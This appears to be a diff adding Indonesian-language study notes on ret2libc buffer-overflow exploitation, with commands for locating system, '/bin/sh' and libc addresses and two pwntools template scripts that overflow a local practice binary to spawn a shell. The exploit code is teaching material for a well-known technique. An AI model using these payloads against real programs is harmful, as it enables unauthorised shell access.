@@ -1,0 +1,69 @@
+system : alamat address (0x)
+bin/sh : alamat address (0x)
+locate libc : alamat address (0x)
+
+
+locate_libc = ...
+system = locate_libc + 0x....
+bin/sh = locate_libc + 0x....
+
+padding/yang bisa membuat overflow
+
+payload = asm('sembarang')*padding+system+0x0+bin/sh
+
+
+
+1. biasanya untuk mencari system bisa dilakukan print system pada gdb atau dengan readelf -s <nama file> |grep system
+2. untuk mengambil bin/sh kita bisa mengetikkan strings -a -t x <nama file> | grep "bin/sh"
+3. untuk mendapatkan lokasi dari libc bisa gunakan perintah ldd <nama file>
+
+
+
+
+=====================================================================
+CONTOH SCRIPT UNTUK EXPLOITASI RET2LIBC PADA 32-bit
+
+from pwn import *
+
+p = process('./vuln-32')
+
+libc_base = 0xf7dc2000
+system = libc_base + 0x44f00
+binsh = libc_base + 0x18c32b
+
+payload = b'A' * 76         # The padding
+payload += p32(system)      # Location of system
+payload += p32(0x0)         # return pointer - not important once we get the shell
+payload += p32(binsh)       # pointer to command: /bin/sh
+
+p.clean()
+p.sendline(payload)
+p.interactive()
+
+
+
+
+
+
+========================================================================
+CONTOH SCRIPT UNTUK EXPLOITASI RET2LIBC PADA 64-bit
+
+from pwn import *
+
+p = process('nama file')
+
+libc_base = 0x
+system = libc_base + 0x
+binsh = libc_base + 0x
+
+POP_RDI = 0x
+
+payload = b'A' * 72         # The padding
+payload += p64(POP_RDI)     # gadget -> pop rdi; ret
+payload += p64(binsh)       # pointer to command: /bin/sh
+payload += p64(system)      # Location of system
+payload += p64(0x0)         # return pointer - not important once we get the shell
+
+p.clean()
+p.sendline(payload)
+p.interactive()
